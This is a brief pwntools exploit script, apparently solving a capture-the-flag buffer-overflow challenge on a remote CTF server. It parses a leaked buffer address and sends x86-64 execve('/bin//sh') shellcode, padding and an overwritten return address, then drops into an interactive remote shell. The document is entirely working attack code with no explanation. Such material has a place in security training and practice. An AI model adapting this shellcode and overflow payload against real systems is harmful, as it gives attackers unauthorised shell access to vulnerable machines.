from pwn import *
  
# p = process('./Simple_size_bof')
p = remote("ctf.j0n9hyun.xyz", 3005)

p.recvuntil('buf: ')
buf = int(p.recv(16)[0:],16) # p.recv().decode()[:14]
shellcode = b"\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05" # 31byte

payload = shellcode
payload += b"A"  * 27929 # 27929 = 0x6D30 - len(shellcode) + 0x8
payload += p64(buf)

p.sendline(payload)

p.interactive()
